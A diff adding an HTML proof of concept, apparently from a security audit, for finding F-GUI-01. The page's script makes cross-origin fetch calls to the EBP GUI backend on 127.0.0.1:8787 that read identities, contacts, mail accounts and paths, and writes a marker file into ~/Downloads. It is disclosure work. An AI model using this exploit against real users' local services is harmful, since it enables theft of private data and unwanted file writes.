@@ -1,0 +1,72 @@
+<!doctype html>
+<!--
+  F-GUI-01 — Cross-origin attacks against the EBP GUI local backend.
+
+  When the user has the EBP GUI backend running at http://127.0.0.1:8787
+  (e.g. they have the desktop app open, or `deno task gui` running), any
+  webpage they visit while that backend is up can read identity metadata,
+  contact lists, mail accounts, and write arbitrary files into ~/Downloads/.
+
+  The local backend sets `access-control-allow-origin: *` and performs no
+  Host-header validation, no Origin check, and no CSRF token check.
+
+  HOW TO REPRODUCE:
+    1.  Start the EBP GUI:  deno task gui
+    2.  Open this file in a browser (just by double-clicking).
+    3.  Click the buttons; observe identity / contact data leak and
+        a file appearing in ~/Downloads/EBP_PWNED.txt.
+-->
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>F-GUI-01 PoC — Cross-origin attack on EBP GUI local backend</title>
+    <style>
+      body { font: 13px monospace; padding: 1em; max-width: 900px; }
+      pre { background: #f5f5f5; padding: 1em; max-height: 300px; overflow: auto; }
+      button { margin: 0.5em 0.25em; padding: 0.5em 1em; }
+    </style>
+  </head>
+  <body>
+    <h1>F-GUI-01 — EBP GUI local backend cross-origin PoC</h1>
+    <p>This page is served from a non-127.0.0.1 origin (a real attacker would host it on, say,
+       <code>https://attacker.example/</code>). It uses <code>fetch(..., {mode: 'cors'})</code>
+       against <code>http://127.0.0.1:8787</code>.</p>
+
+    <button id="btn-health">1. Check backend reachable</button>
+    <button id="btn-identities">2. Leak local identity list</button>
+    <button id="btn-contacts">3. Leak contacts</button>
+    <button id="btn-mail-accounts">4. Leak mail accounts</button>
+    <button id="btn-save-file">5. Drive-by file write to ~/Downloads/EBP_PWNED.txt</button>
+    <button id="btn-context">6. Leak filesystem paths (~/.ebp dir)</button>
+
+    <h2>Output</h2>
+    <pre id="out">(click a button)</pre>
+
+    <script>
+      const BASE = "http://127.0.0.1:8787";
+      const out = document.getElementById("out");
+      function log(o) { out.textContent = typeof o === "string" ? o : JSON.stringify(o, null, 2); }
+
+      async function call(path, opts = {}) {
+        const res = await fetch(BASE + path, { ...opts, mode: "cors" });
+        const text = await res.text();
+        try { return JSON.parse(text); } catch { return text; }
+      }
+
+      document.getElementById("btn-health").onclick = async () => log(await call("/api/v1/health"));
+      document.getElementById("btn-identities").onclick = async () => log(await call("/api/v1/identities"));
+      document.getElementById("btn-contacts").onclick = async () => log(await call("/api/v1/contacts"));
+      document.getElementById("btn-mail-accounts").onclick = async () => log(await call("/api/v1/mail/accounts"));
+      document.getElementById("btn-context").onclick = async () => log(await call("/api/v1/context"));
+      document.getElementById("btn-save-file").onclick = async () =>
+        log(await call("/api/v1/save-file", {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({
+            filename: "EBP_PWNED.txt",
+            content: "If you can read this, an arbitrary website wrote to your ~/Downloads/.\nF-GUI-01 confirmed.\n",
+          }),
+        }));
+    </script>
+  </body>
+</html>
